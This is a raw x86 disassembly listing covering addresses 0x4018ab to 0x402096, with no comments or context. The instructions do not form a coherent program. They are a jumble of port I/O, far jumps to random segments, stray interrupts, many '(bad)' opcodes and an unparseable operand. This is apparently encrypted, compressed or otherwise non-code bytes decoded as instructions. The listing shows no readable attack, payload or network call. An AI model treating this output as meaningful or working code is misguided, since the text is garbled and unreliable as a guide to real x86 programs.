  4018ab:	push   es
  4018ac:	ja     0x4018c4
  4018ae:	out    0x8e,eax
  4018b0:	sbb    bh,BYTE PTR [esi+0x3e]
  4018b3:	scas   al,BYTE PTR es:[edi]
  4018b4:	or     esp,DWORD PTR [edx-0x304d6ff1]
  4018ba:	mov    ah,0x14
  4018bc:	push   esp
  4018bd:	mov    BYTE PTR [ebx+0x25],cl
  4018c0:	lahf   
  4018c1:	into   
  4018c2:	mov    bh,0x82
  4018c4:	inc    edi
  4018c5:	in     al,dx
  4018c6:	jl     0x40189f
  4018c8:	mov    ah,0x8f
  4018ca:	aas    
  4018cb:	ret    0xc1ca
  4018ce:	ss pop eax
  4018d0:	mov    ah,0x3f
  4018d2:	out    dx,eax
  4018d3:	dec    eax
  4018d4:	add    BYTE PTR [ebx+edx*4-0x5f],dl
  4018d8:	call   0x636fe6fa
  4018dd:	and    DWORD PTR [edx+ebx*8],ebx
  4018e0:	fadd   DWORD PTR [ebp-0x7b7bbdf5]
  4018e6:	inc    ebp
  4018e7:	fild   WORD PTR [ebx-0x31]
  4018ea:	xor    eax,0xd48da141
  4018ef:	fistp  QWORD PTR [ebx+0x4]
  4018f2:	cli    
  4018f3:	mov    WORD PTR [ecx-0x387a0e64],ss
  4018f9:	pop    edi
  4018fa:	or     dl,BYTE PTR [ecx+0x1]
  4018fd:	shl    ebp,1
  4018ff:	pushf  
  401900:	dec    esp
  401901:	cmp    bh,BYTE PTR [ebx]
  401903:	sub    cl,BYTE PTR [ebp+0x728b8306]
  401909:	das    
  40190a:	cli    
  40190b:	pop    es
  40190c:	sahf   
  40190d:	shl    ah,0x1
  401910:	sub    DWORD PTR [ebp+0x57],ecx
  401913:	inc    edi
  401914:	stos   BYTE PTR es:[edi],al
  401915:	inc    eax
  401916:	mov    edx,0x3778d6a5
  40191b:	sub    al,0x48
  40191d:	jo     0x40192c
  40191f:	adc    eax,0xe1d34310
  401924:	sbb    eax,0x544ec25f
  401929:	inc    edx
  40192a:	mov    dh,0xc4
  40192c:	sbb    eax,0xbe48cc41
  401931:	(bad)  [ebp+0x1ccbddb7]
  401937:	popa   
  401938:	push   esi
  401939:	fisub  DWORD PTR [edi+0x40]
  40193c:	mov    edx,0xf81714e6
  401941:	pop    ds
  401942:	ds dec ebp
  401944:	push   0x8f34a1c0
  401949:	test   eax,0x75c049fd
  40194e:	add    DWORD PTR [edi],edi
  401950:	(bad)  
  401951:	mov    bh,0x4c
  401953:	pushf  
  401954:	(bad)  
  401955:	xchg   esp,eax
  401956:	mov    dh,0x90
  401958:	mov    DWORD PTR [edi+0x604ce20a],esp
  40195e:	nop
  40195f:	loopne 0x401959
  401961:	jle    0x401917
  401963:	pop    es
  401964:	cwde   
  401965:	idiv   BYTE PTR [edx+0x63b32cf0]
  40196b:	sub    BYTE PTR [ebx],ch
  40196d:	data16 aad 0x17
  401970:	in     eax,0x78
  401972:	mov    ecx,0xc1d58d0
  401977:	loop   0x401980
  401979:	dec    esi
  40197a:	xchg   ebp,eax
  40197b:	fild   WORD PTR ds:0x6303bb0b
  401981:	shl    BYTE PTR [edi],1
  401983:	and    dl,al
  401985:	(bad)  
  401986:	mov    eax,ds:0xa9a626f3
  40198b:	retf   0x668
  40198e:	and    eax,0x9e2dc81
  401993:	dec    ebx
  401994:	xchg   edi,eax
  401995:	xchg   DWORD PTR [ebx+ebx*4+0x21b2283c],ebx
  40199c:	aaa    
  40199d:	(bad)  
  40199f:	add    BYTE PTR [ebx+0x3e62bebd],bl
  4019a5:	gs scas eax,DWORD PTR es:[edi]
  4019a7:	and    eax,edi
  4019a9:	pop    edx
  4019aa:	lods   eax,DWORD PTR ds:[esi]
  4019ab:	fidiv  DWORD PTR [edx+0x55]
  4019ae:	sbb    al,0xc8
  4019b0:	push   0xced8bfef
  4019b5:	mov    edi,0xe67760de
  4019ba:	mov    ds:0xde036958,al
  4019bf:	sbb    al,0xce
  4019c1:	imul   esp,esi,0x6c95073d
  4019c7:	and    BYTE PTR [ebx],dl
  4019c9:	push   esp
  4019ca:	shl    BYTE PTR [edi],cl
  4019cc:	jmp    0x4019fa
  4019ce:	mov    eax,ebx
  4019d0:	xchg   ebx,eax
  4019d1:	fwait
  4019d2:	(bad)  
  4019d3:	dec    ebx
  4019d4:	xchg   ah,dl
  4019d6:	push   esi
  4019d7:	sahf   
  4019d8:	dec    esp
  4019d9:	sub    al,0x81
  4019db:	dec    edx
  4019dc:	fsub   DWORD PTR [edi+0x32f5a0c9]
  4019e2:	adc    BYTE PTR [edi],ah
  4019e4:	dec    ebx
  4019e5:	sub    dl,BYTE PTR [esp+edi*2]
  4019e8:	outs   dx,DWORD PTR ds:[esi]
  4019e9:	or     DWORD PTR [ecx-0x3f975e29],ebx
  4019ef:	cmp    al,0x62
  4019f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019f2:	repnz daa 
  4019f4:	pop    eax
  4019f5:	push   ebx
  4019f6:	aaa    
  4019f7:	mov    ch,0xcf
  4019f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019fa:	sahf   
  4019fb:	(bad)  
  4019fc:	mov    BYTE PTR [esi],0xfe
  4019ff:	mov    al,ds:0x3775ea7e
  401a04:	out    dx,eax
  401a05:	stos   DWORD PTR es:[edi],eax
  401a06:	imul   eax,edi,0x2e1d8727
  401a0c:	dec    esp
  401a0d:	lods   eax,DWORD PTR ds:[esi]
  401a0e:	push   ecx
  401a0f:	and    DWORD PTR [esi-0x9dd7517],eax
  401a15:	sbb    eax,0x9134c509
  401a1a:	sbb    bl,BYTE PTR [edx]
  401a1c:	xor    ah,al
  401a1e:	out    dx,eax
  401a1f:	push   ecx
  401a20:	mov    bl,0x6c
  401a22:	fidivr WORD PTR [edi]
  401a24:	sar    DWORD PTR [eax+esi*1-0x7ac0845b],1
  401a2b:	std    
  401a2c:	std    
  401a2d:	shr    DWORD PTR [eax],0x8
  401a30:	inc    ecx
  401a31:	jnp    0x401a24
  401a33:	rcl    edi,cl
  401a35:	fadd   DWORD PTR [ecx-0x4d3cad4c]
  401a3b:	out    0xdf,al
  401a3d:	and    esp,DWORD PTR [esi]
  401a3f:	out    dx,eax
  401a40:	leave  
  401a41:	loope  0x401a55
  401a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a44:	lds    esi,FWORD PTR [edi-0x60]
  401a47:	daa    
  401a48:	(bad)  
  401a49:	fwait
  401a4a:	aam    0x8e
  401a4c:	ret    
  401a4d:	sub    bh,dl
  401a4f:	mov    eax,ds:0xde73c8c6
  401a54:	fwait
  401a55:	jg     0x4019f9
  401a57:	lahf   
  401a58:	cs push ebx
  401a5a:	dec    ecx
  401a5b:	enter  0x84b0,0xe8
  401a5f:	and    DWORD PTR [edi-0x4e44b0c3],0xffffffb0
  401a66:	loope  0x401abd
  401a68:	fld    QWORD PTR [esi-0x55e628bb]
  401a6e:	cmp    BYTE PTR [ebx],al
  401a70:	int3   
  401a71:	jg     0x401a7d
  401a73:	out    dx,al
  401a74:	and    dh,BYTE PTR [edi]
  401a76:	or     BYTE PTR [esi],0xdc
  401a79:	dec    edi
  401a7a:	xchg   esi,eax
  401a7b:	xor    DWORD PTR [eax],0x6939fb6e
  401a81:	je     0x401ad5
  401a83:	mov    edi,0xfb1cfb0e
  401a88:	repnz (bad)
  401a8b:	or     DWORD PTR [eax-0x4c],eax
  401a8e:	out    0xb6,al
  401a90:	bound  esi,QWORD PTR [eax+0x5c]
  401a93:	test   DWORD PTR [edi-0x590adb1a],ebp
  401a99:	xchg   BYTE PTR [ebp-0x99b0d4d],dl
  401a9f:	xchg   esi,eax
  401aa0:	aaa    
  401aa1:	jbe    0x401a5f
  401aa3:	scas   al,BYTE PTR es:[edi]
  401aa4:	mov    ds:0x55399a7f,eax
  401aa9:	jmp    0x401b11
  401aab:	rcr    BYTE PTR [edx+0x77],0xf9
  401aaf:	ret    0x1325
  401ab2:	popf   
  401ab3:	sub    DWORD PTR [ebx],edi
  401ab5:	mov    al,ds:0xf4ce4018
  401aba:	call   0x65f6:0x79e435ce
  401ac1:	push   ecx
  401ac2:	fistp  WORD PTR [edx]
  401ac4:	xchg   esi,eax
  401ac5:	sub    BYTE PTR [ecx+0x4db8c843],ch
  401acb:	test   DWORD PTR [ecx+0x73],eax
  401ace:	(bad)  
  401ad0:	js     0x401ab6
  401ad2:	aad    0x2c
  401ad4:	inc    esi
  401ad5:	out    0x9,eax
  401ad7:	cmp    ebp,ebx
  401ad9:	inc    ebx
  401ada:	mov    eax,0x873c24af
  401adf:	pushf  
  401ae0:	(bad)  
  401ae2:	sub    ch,dl
  401ae4:	in     al,dx
  401ae5:	push   edi
  401ae6:	jecxz  0x401b20
  401ae8:	jb     0x401a93
  401aea:	dec    ecx
  401aeb:	lods   eax,DWORD PTR ds:[esi]
  401aec:	adc    al,0x66
  401aee:	jp     0x401ad7
  401af0:	adc    al,0xe9
  401af2:	in     al,0xdd
  401af4:	sub    eax,0x637dac63
  401af9:	sbb    eax,0x530af269
  401afe:	rcl    DWORD PTR [ebx],0xa8
  401b01:	das    
  401b02:	inc    ebx
  401b03:	sub    DWORD PTR [ebp+0x2226d0bd],0xffffffc7
  401b0a:	cmp    edi,ebp
  401b0c:	pop    eax
  401b0d:	mov    DWORD PTR [esi+0x10e38b77],edx
  401b13:	xchg   BYTE PTR [edi-0xa],dl
  401b16:	xlat   BYTE PTR ds:[ebx]
  401b17:	ret    0x9921
  401b1a:	rcr    BYTE PTR [eax+0x6f],0xad
  401b1e:	int    0xfb
  401b20:	and    al,0xcf
  401b22:	mov    ebx,0xf3ae580b
  401b27:	dec    esp
  401b28:	lock push ebx
  401b2a:	icebp  
  401b2b:	xchg   cl,dl
  401b2d:	cmp    dl,BYTE PTR [eax]
  401b2f:	loopne 0x401ac5
  401b31:	push   esi
  401b32:	(bad)  
  401b35:	cmp    DWORD PTR ds:0xb33e5a12,0xffffffd9
  401b3c:	adc    BYTE PTR [edi],0xd5
  401b3f:	pop    esi
  401b40:	emms   
  401b42:	scas   eax,DWORD PTR es:[edi]
  401b43:	xchg   edi,eax
  401b44:	push   edi
  401b45:	mov    esp,0xa5eb028e
  401b4a:	sbb    ah,cl
  401b4c:	jb     0x401b02
  401b4e:	std    
  401b4f:	ja     0x401b7b
  401b51:	(bad)  
  401b52:	stos   BYTE PTR es:[edi],al
  401b53:	lods   eax,DWORD PTR ds:[esi]
  401b54:	pop    ds
  401b55:	xchg   edx,eax
  401b56:	mov    cs,esp
  401b58:	or     dl,BYTE PTR [ebp+0x50093a38]
  401b5e:	dec    BYTE PTR [edx+ebx*4]
  401b61:	jmp    0x611111c0
  401b66:	daa    
  401b67:	or     eax,ebp
  401b69:	std    
  401b6a:	inc    ebp
  401b6b:	adc    BYTE PTR [edi],ah
  401b6d:	in     al,0xfc
  401b6f:	sahf   
  401b70:	jg     0x401b56
  401b72:	or     al,0x37
  401b74:	jmp    0x9630:0x8294c77b
  401b7b:	push   esi
  401b7c:	call   0x8f09f679
  401b81:	inc    esp
  401b82:	jmp    0x401b29
  401b84:	fldcw  WORD PTR [eax-0x10]
  401b87:	pop    ebx
  401b88:	dec    esp
  401b89:	sub    al,0x9f
  401b8b:	lods   eax,DWORD PTR ds:[esi]
  401b8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b8d:	or     eax,eax
  401b8f:	loope  0x401b77
  401b91:	sbb    DWORD PTR [ecx+0x3e74f052],0xffffffa8
  401b98:	call   0x881ae401
  401b9d:	mov    DWORD PTR [eax+0x7ba9ea6b],edi
  401ba3:	mov    es,edi
  401ba5:	repz push esi
  401ba7:	mov    edx,0x8983994b
  401bac:	add    cl,BYTE PTR [esp+edx*2]
  401baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bb0:	pop    ds
  401bb1:	les    esi,FWORD PTR [ebx-0x2d]
  401bb4:	jecxz  0x401c29
  401bb6:	stc    
  401bb7:	push   0xfa77a26
  401bbc:	pop    ss
  401bbd:	adc    DWORD PTR [edi+esi*8-0x80],ebp
  401bc1:	arpl   si,bp
  401bc3:	lds    ecx,FWORD PTR [ecx+ebp*4+0x6bb4556a]
  401bca:	inc    ecx
  401bcb:	fwait
  401bcc:	es jae 0x401b82
  401bcf:	ret    0xbe57
  401bd2:	inc    ebp
  401bd3:	popa   
  401bd4:	dec    eax
  401bd5:	out    0x85,al
  401bd7:	mov    bl,BYTE PTR [eax]
  401bd9:	mov    dl,0xa4
  401bdb:	repz ds jnp 0x401b86
  401bdf:	pop    eax
  401be0:	mov    bl,0x96
  401be2:	sub    BYTE PTR [ebx-0x33],cl
  401be5:	fdivr  QWORD PTR [esi+0x862b2d0]
  401beb:	ja     0x401bf2
  401bed:	and    ecx,DWORD PTR [ebp+0x23]
  401bf0:	cld    
  401bf1:	cmp    BYTE PTR [edx+0x21],ah
  401bf4:	sbb    esi,DWORD PTR [ebp-0x59]
  401bf7:	pop    ecx
  401bf8:	jbe    0x401bbf
  401bfa:	ds add eax,0x96fa33ce
  401c00:	sub    dl,BYTE PTR [ebp+eiz*1-0x1e]
  401c04:	or     esi,DWORD PTR [ebx-0x22]
  401c07:	sar    DWORD PTR [edx+0x31],1
  401c0a:	push   ecx
  401c0b:	or     BYTE PTR [ecx+0x7c],cl
  401c0e:	mov    ecx,0x6bf844c0
  401c13:	fs jae 0x401b9a
  401c16:	pop    esp
  401c17:	hlt    
  401c18:	rol    DWORD PTR [esi],1
  401c1a:	imul   BYTE PTR [edi]
  401c1c:	push   ebx
  401c1d:	je     0x401c76
  401c1f:	icebp  
  401c20:	mov    eax,0xa5af0aa3
  401c25:	gs sub al,0x56
  401c28:	jl     0x401c40
  401c2a:	out    0x54,al
  401c2c:	shr    DWORD PTR [edi+0x17cfe934],cl
  401c32:	or     ah,BYTE PTR [esi-0x2]
  401c35:	dec    ebp
  401c36:	aam    0xfe
  401c38:	sub    ebx,DWORD PTR [ebp+esi*8-0x50734d0]
  401c3f:	not    BYTE PTR [ebx]
  401c41:	adc    DWORD PTR [eax],esi
  401c43:	push   ss
  401c44:	add    BYTE PTR [ebp+eiz*1+0x6f14312e],dh
  401c4b:	popf   
  401c4c:	and    eax,0x25c7a874
  401c51:	mov    al,ds:0xfead86a3
  401c56:	ret    0x5859
  401c59:	mov    edi,0xb5b0b06c
  401c5e:	out    0xd0,al
  401c60:	bound  edx,QWORD PTR [esi-0x75]
  401c63:	or     ebx,esp
  401c65:	sbb    eax,0x42abd03f
  401c6a:	inc    ecx
  401c6b:	not    BYTE PTR ss:[ebp-0x46]
  401c6f:	cmp    eax,DWORD PTR [esi]
  401c71:	dec    esp
  401c72:	pop    edx
  401c73:	call   0x6f2e8cc0
  401c78:	outs   dx,BYTE PTR ds:[esi]
  401c79:	pop    ss
  401c7a:	imul   esp,DWORD PTR [ebx-0x73],0x61
  401c7e:	(bad)  
  401c7f:	in     eax,0xbd
  401c81:	lds    eax,FWORD PTR [ecx+0x66]
  401c84:	inc    ecx
  401c85:	xor    eax,0x92143572
  401c8a:	int    0x5f
  401c8c:	sub    BYTE PTR [edi+0x70],al
  401c8f:	icebp  
  401c90:	jg     0x401c70
  401c92:	jns    0x401c35
  401c94:	mov    eax,0x817118af
  401c99:	mov    al,ds:0x9879d1b7
  401c9f:	test   eax,0x5733327f
  401ca4:	or     eax,DWORD PTR [eax-0x24e323d8]
  401caa:	inc    esi
  401cab:	fist   WORD PTR [esi-0x1]
  401cae:	mov    esi,0xb594f53f
  401cb3:	add    al,0x2d
  401cb5:	pop    ds
  401cb6:	and    BYTE PTR [ebx+0x7624048f],0x8f
  401cbd:	sub    dl,ch
  401cbf:	inc    edi
  401cc0:	in     eax,dx
  401cc1:	loope  0x401c43
  401cc3:	lock mov eax,0x54b70df
  401cc9:	jo     0x401ccd
  401ccb:	dec    esp
  401ccc:	mov    al,0xda
  401cce:	aam    0xf3
  401cd0:	cmp    bh,BYTE PTR [ebx+0x27]
  401cd3:	xor    bh,al
  401cd5:	test   eax,0x18f5b54e
  401cda:	aad    0xd
  401cdc:	aad    0x79
  401cde:	mov    al,ds:0xa3b0133d
  401ce3:	shl    esp,0x34
  401ce6:	aam    0x21
  401ce8:	mov    bl,0xfd
  401cea:	loopne 0x401cbc
  401cec:	pop    esi
  401ced:	gs pop ds
  401cef:	popf   
  401cf0:	xchg   edi,eax
  401cf1:	sbb    esp,esi
  401cf3:	or     esp,DWORD PTR [esi+0x4c08cc31]
  401cf9:	cld    
  401cfa:	mov    gs:0x75b130cd,al
  401d00:	push   ebp
  401d01:	aam    0x75
  401d03:	out    dx,eax
  401d04:	inc    edi
  401d05:	pop    ebx
  401d06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d07:	int3   
  401d08:	fs inc ecx
  401d0a:	fwait
  401d0b:	call   0x4b266d85
  401d10:	(bad)  
  401d11:	int    0x47
  401d13:	call   0x24c502a7
  401d18:	les    ebx,FWORD PTR [edx]
  401d1a:	dec    ebx
  401d1b:	xchg   ebp,eax
  401d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d1d:	add    DWORD PTR [ebp-0x24f4a29],eax
  401d23:	xchg   DWORD PTR [ebx+0xe470a32],ebx
  401d29:	adc    eax,0x3c3ba9b4
  401d2e:	fist   WORD PTR [ebp-0x14]
  401d31:	mov    edi,DWORD PTR [ebx+0x23805bc3]
  401d37:	xchg   edx,eax
  401d38:	push   ss
  401d39:	pop    ecx
  401d3a:	lods   al,BYTE PTR ds:[esi]
  401d3b:	mov    cs,WORD PTR [esi]
  401d3d:	and    DWORD PTR [eax+0x574b0d4e],ebx
  401d43:	mov    bh,0x72
  401d45:	adc    ecx,DWORD PTR [eiz*4-0x6ffd41b7]
  401d4c:	aam    0x7b
  401d4e:	in     al,0x87
  401d50:	jle    0x401dca
  401d52:	or     bh,BYTE PTR [edx]
  401d54:	add    DWORD PTR [eax+0x41],0x7b40454d
  401d5b:	sub    DWORD PTR [ecx+0xd319448],esp
  401d61:	sbb    esp,DWORD PTR [esi+eiz*8]
  401d64:	dec    ecx
  401d65:	xchg   ebx,eax
  401d66:	imul   ebx,DWORD PTR [ebx],0xffffffda
  401d69:	and    eax,0x8f289dac
  401d6e:	push   eax
  401d6f:	push   ebx
  401d70:	add    DWORD PTR [ebp-0x2a],ecx
  401d73:	in     eax,0xf
  401d75:	jo     0x401df3
  401d77:	mov    edx,0xe33011f2
  401d7c:	cs cwde 
  401d7e:	in     eax,dx
  401d7f:	and    al,0xa6
  401d81:	mov    WORD PTR [ebp-0x1],?
  401d84:	push   sp
  401d86:	sbb    bl,BYTE PTR ds:0x2154d53b
  401d8c:	ins    DWORD PTR es:[edi],dx
  401d8d:	adc    al,0xce
  401d8f:	add    bl,BYTE PTR [esi-0x7f]
  401d92:	mov    ch,0x9e
  401d94:	cmp    ecx,edi
  401d96:	push   ss
  401d97:	sub    dl,BYTE PTR [ecx-0x4928e0c0]
  401d9d:	sub    al,0xad
  401d9f:	sub    al,0xd7
  401da1:	popa   
  401da2:	sahf   
  401da3:	xor    esi,0xc490ed66
  401da9:	add    ebp,ebx
  401dab:	shl    BYTE PTR [ecx+0x70ab8612],0x5
  401db2:	cmp    dh,BYTE PTR [edi+0x76]
  401db5:	mov    cs,WORD PTR [edi+esi*4+0x6149b4d0]
  401dbc:	xchg   ebp,eax
  401dbd:	lds    esi,FWORD PTR ds:0x79230b33
  401dc3:	jae    0x401d87
  401dc5:	pop    es
  401dc6:	add    ch,ch
  401dc8:	fcomp  DWORD PTR [esi+0x4]
  401dcb:	mov    eax,0xf108217b
  401dd0:	pop    ecx
  401dd1:	or     eax,0x9711785b
  401dd6:	scas   al,BYTE PTR es:[edi]
  401dd7:	push   esi
  401dd8:	cmc    
  401dd9:	fcmovne st,st(7)
  401ddb:	jp     0x401e15
  401ddd:	lods   eax,DWORD PTR ds:[esi]
  401dde:	inc    edx
  401ddf:	test   eax,edx
  401de1:	or     esp,0x51
  401de4:	xchg   edi,eax
  401de5:	inc    ebp
  401de6:	lods   eax,DWORD PTR ds:[esi]
  401de7:	xchg   edi,eax
  401de8:	jmp    0x186b:0xf0b1f1ef
  401def:	leave  
  401df0:	cmp    esp,DWORD PTR [ebx]
  401df2:	scas   eax,DWORD PTR es:[edi]
  401df3:	lahf   
  401df4:	cmp    bl,ch
  401df6:	daa    
  401df7:	pcmpgtd mm1,QWORD PTR [esp+ebx*2]
  401dfb:	hlt    
  401dfc:	inc    eax
  401dfd:	repnz sti 
  401dff:	daa    
  401e00:	jno    0x401e41
  401e02:	jecxz  0x401e06
  401e04:	fmul   DWORD PTR [eax-0x5ee0dcc0]
  401e0a:	add    ebx,ecx
  401e0c:	jb     0x401e8a
  401e0e:	dec    esp
  401e0f:	ds hlt 
  401e11:	mov    ebp,0xc4f321fd
  401e16:	cmp    BYTE PTR [esp+eax*1],ah
  401e19:	loop   0x401e02
  401e1b:	stos   DWORD PTR es:[edi],eax
  401e1c:	or     dh,BYTE PTR [edx+0x64a044aa]
  401e22:	or     BYTE PTR ds:0x3f2865d9,bh
  401e28:	out    0x22,eax
  401e2a:	or     DWORD PTR [ebp+edx*8+0x2b37f59],esi
  401e31:	ror    BYTE PTR [ebx],0x57
  401e34:	jg     0x401e66
  401e36:	push   ebx
  401e37:	sub    al,0xfa
  401e39:	and    BYTE PTR [edx-0x1],ch
  401e3c:	fild   QWORD PTR [ebx]
  401e3e:	dec    edx
  401e3f:	pop    ebx
  401e40:	jmp    0x401e7e
  401e42:	pusha  
  401e43:	test   BYTE PTR [edx],cl
  401e45:	repnz push ss
  401e47:	ret    0x42c6
  401e4a:	das    
  401e4b:	inc    edi
  401e4c:	int    0x54
  401e4e:	adc    DWORD PTR [edi-0x41],edi
  401e51:	push   eax
  401e52:	jbe    0x401ea4
  401e54:	ins    BYTE PTR es:[edi],dx
  401e55:	xor    al,BYTE PTR [ecx+0x72]
  401e58:	fidiv  WORD PTR [ecx-0x4d]
  401e5b:	jmp    0x401ea1
  401e5d:	out    0x1d,al
  401e5f:	pop    ds
  401e60:	mov    ecx,0xbe66140
  401e65:	pop    ds
  401e66:	cdq    
  401e67:	mov    DWORD PTR [edi-0x4f29f020],edi
  401e6d:	inc    DWORD PTR [edi]
  401e6f:	and    eax,0x2b76426e
  401e74:	dec    eax
  401e75:	(bad)  
  401e76:	imul   ecx,DWORD PTR [ecx],0xffffffdd
  401e79:	mov    ebp,0xeeb5fbfe
  401e7e:	xor    DWORD PTR [ecx-0x54d41947],esi
  401e84:	jne    0x401efd
  401e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e87:	and    BYTE PTR [esi+0x78edf937],0x64
  401e8e:	shl    BYTE PTR [edi+eiz*2+0xd],0x8b
  401e93:	in     eax,0xa8
  401e95:	mov    ah,0xa5
  401e97:	test   al,0x5c
  401e99:	mov    ebx,0x950dba98
  401e9e:	repnz or eax,0xa6cd69de
  401ea4:	iret   
  401ea5:	not    esp
  401ea7:	ror    bl,cl
  401ea9:	daa    
  401eaa:	cdq    
  401eab:	enter  0x5f1b,0xdb
  401eaf:	mov    ds:0x70a780f,al
  401eb4:	mov    ebp,0xdb22e8f1
  401eb9:	fadd   QWORD PTR ds:0xc09c5c7b
  401ebf:	push   edx
  401ec0:	mov    al,ds:0x41300a0f
  401ec5:	xchg   esi,eax
  401ec6:	cmp    al,0x49
  401ec8:	xor    eax,0x8d590b1
  401ecd:	cmp    al,0x74
  401ecf:	mov    al,0x55
  401ed1:	call   FWORD PTR [edx-0x158142f4]
  401ed7:	pop    ds
  401ed8:	cmp    eax,0x138091a0
  401edd:	pop    ecx
  401ede:	loopne 0x401e6d
  401ee0:	mov    BYTE PTR [edi+edx*2+0x10f05c57],al
  401ee7:	mov    cl,0xe0
  401ee9:	push   cs
  401eea:	and    bl,BYTE PTR [edi]
  401eec:	es leave 
  401eee:	inc    ebx
  401eef:	adc    eax,0x55375fb4
  401ef4:	sub    eax,0x7f05be2c
  401ef9:	fld    DWORD PTR [ebx-0x4429d6f]
  401eff:	xor    al,0x44
  401f01:	push   esi
  401f02:	dec    ebp
  401f03:	inc    eax
  401f04:	mov    dh,0x1f
  401f06:	imul   edi
  401f08:	and    DWORD PTR [ebx],ecx
  401f0a:	mov    esi,0xa087702b
  401f0f:	sahf   
  401f10:	mov    bh,0x98
  401f12:	fdivp  st(7),st
  401f14:	xor    al,0x4d
  401f16:	call   0x91e0:0xaf1d376d
  401f1d:	cmp    DWORD PTR [edi-0x2d6e856f],0x755ca28b
  401f27:	ins    BYTE PTR es:[edi],dx
  401f28:	xchg   ecx,ebp
  401f2a:	jne    0x401eed
  401f2c:	inc    ebp
  401f2d:	dec    ebx
  401f2e:	std    
  401f2f:	aas    
  401f30:	jbe    0x401f79
  401f32:	ret    
  401f33:	push   ds
  401f34:	sbb    BYTE PTR [eax-0x4ad9ee38],al
  401f3a:	push   cs
  401f3b:	mov    edx,0x7d63
  401f40:	xor    eax,0x1bb09bf
  401f45:	mov    edi,eax
  401f47:	stc    
  401f48:	pop    ds
  401f49:	jmp    0xdca0:0x15ea1a8e
  401f50:	fs ds addr16 test al,0x7
  401f55:	jmp    0x107a4b4
  401f5a:	loopne 0x401f18
  401f5c:	scas   al,BYTE PTR es:[edi]
  401f5d:	js     0x401f28
  401f5f:	add    eax,0x8fb45b56
  401f64:	mov    edi,0xc8e82476
  401f69:	jns    0x401f0c
  401f6b:	dec    ecx
  401f6c:	in     al,0xe8
  401f6e:	inc    ebp
  401f6f:	dec    esp
  401f70:	sbb    ebx,DWORD PTR [ecx]
  401f72:	push   esi
  401f73:	jmp    0x4834:0x49ba0dac
  401f7a:	cmp    DWORD PTR [edx],ebp
  401f7c:	jmp    0x55c57c8c
  401f81:	inc    ebp
  401f82:	addr16 jo 0x33f1d819
  401f89:	fld    DWORD PTR [edi+0x1b]
  401f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f8d:	mov    edx,0xb0aec2ac
  401f92:	inc    esi
  401f93:	jmp    0xf349:0x3d3cd6d8
  401f9a:	std    
  401f9b:	aas    
  401f9c:	ret    0x3505
  401f9f:	popf   
  401fa0:	pop    edi
  401fa1:	or     eax,0x943561b
  401fa6:	ja     0x40200f
  401fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fa9:	aam    0xdf
  401fab:	fs (bad) 
  401fad:	xor    esp,ebx
  401faf:	cmp    esi,DWORD PTR [esp+ecx*8+0x1b]
  401fb3:	mov    ah,0xe1
  401fb5:	dec    ebx
  401fb6:	mov    ah,ah
  401fb8:	fwait
  401fb9:	sbb    BYTE PTR [ecx],dh
  401fbb:	mov    esp,0xa8c53a62
  401fc0:	ror    DWORD PTR [edi],1
  401fc2:	mov    ecx,0xd6ab2837
  401fc7:	pop    esp
  401fc8:	addr16 loop 0x401f97
  401fcb:	mov    WORD PTR [eax-0x3e],gs
  401fce:	mov    ecx,0xce119d10
  401fd3:	pop    esp
  401fd4:	and    BYTE PTR [ebx],al
  401fd6:	push   ss
  401fd7:	push   edi
  401fd8:	dec    edx
  401fd9:	lods   eax,DWORD PTR ds:[esi]
  401fda:	or     eax,0xc53c0857
  401fdf:	xchg   esi,eax
  401fe0:	jae    0x402035
  401fe2:	dec    ebx
  401fe3:	mov    ah,0x4f
  401fe5:	dec    edi
  401fe6:	ror    DWORD PTR [ebx+0x74],1
  401fe9:	fisubr DWORD PTR [edi-0x76114537]
  401fef:	into   
  401ff0:	repz push ss
  401ff2:	push   edi
  401ff3:	dec    esi
  401ff4:	arpl   WORD PTR ds:0xcb11f30a,cx
  401ffa:	adc    ebp,edx
  401ffc:	cld    
  401ffd:	int    0x1a
  401fff:	adc    dl,BYTE PTR [eax+eax*2]
  402002:	adc    ch,BYTE PTR [esp-0x5a91e8a3]
  402009:	push   ecx
  40200a:	xchg   ebp,eax
  40200b:	ins    BYTE PTR es:[edi],dx
  40200c:	and    eax,0x92a37043
  402011:	pop    ecx
  402012:	sub    eax,0xb9ec0818
  402017:	xor    al,dl
  402019:	data16 xor al,0x5c
  40201c:	and    eax,0xd004a97d
  402021:	ror    edx,1
  402023:	imul   ebp,ebp,0x96081ca0
  402029:	sbb    esi,edx
  40202b:	retf   0xc7b2
  40202e:	push   esi
  40202f:	mov    ds:0x8d02c953,al
  402034:	out    0x52,al
  402036:	jg     0x40206e
  402038:	std    
  402039:	(bad)  
  40203a:	xor    bl,cl
  40203c:	add    ch,BYTE PTR [edx+0x342bd94]
  402042:	dec    edx
  402043:	cmc    
  402044:	jnp    0x402047
  402046:	add    DWORD PTR ds:0xeb35b774,ebx
  40204c:	mov    cl,0x91
  40204e:	pop    esi
  40204f:	jns    0x4020b2
  402051:	cli    
  402052:	fsin   
  402054:	call   0x65c085eb
  402059:	stos   DWORD PTR es:[edi],eax
  40205a:	repz or ecx,esp
  40205d:	add    DWORD PTR [eax-0x1a970876],ecx
  402063:	add    eax,0x7fd21c02
  402068:	sti    
  402069:	mov    ecx,edi
  40206b:	push   eax
  40206c:	jmp    0x2288:0x3df05a09
  402073:	jae    0x40205c
  402075:	mov    bh,0x8f
  402077:	out    dx,eax
  402078:	fmul   st,st(5)
  40207a:	jp     0x402043
  40207c:	mov    cl,0xbc
  40207e:	cmp    ebp,DWORD PTR [edi+0x69]
  402081:	ror    cl,cl
  402083:	and    BYTE PTR [ecx+edi*8+0x2b],0x7d
  402088:	jns    0x402040
  40208a:	lods   al,BYTE PTR ds:[esi]
  40208b:	and    DWORD PTR [esi],ebp
  40208d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40208e:	push   ds
  40208f:	mov    ebp,0x9b115c80
  402094:	cld    
  402095:	push   eax
  402096:	fs xchg ebx,eax
